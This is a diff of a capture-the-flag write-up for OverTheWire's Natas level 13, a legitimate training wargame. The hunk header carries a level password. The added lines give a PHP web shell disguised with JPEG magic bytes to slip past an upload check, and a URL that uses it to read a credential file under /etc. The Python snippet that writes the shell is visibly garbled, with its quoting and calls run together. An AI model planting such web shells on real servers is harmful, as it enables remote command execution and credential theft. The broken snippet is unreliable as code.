@@ -342,12 +342,10 @@ password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 
 **[Natas13](http://natas13.natas.labs.overthewire.org)**  
 We have source code, it's same Natas12 but it check signature of file, so we try
+http://natas13.natas.labs.overthewire.org/index.php?a=cat%20/etc/natas_webpass/natas14
 ```
-<?php
-    <pre>
-        shell_exec($_GET[data])
-    </pre>
-?>
+shell=open('shell.php','wsshell.write('\xFF\xD8\xFF\xE0'<?php echo shell_exec($_GET["a"]); ?>')
+shell.close()
 ```
 save natas13.php file, upload file and we got
 ```
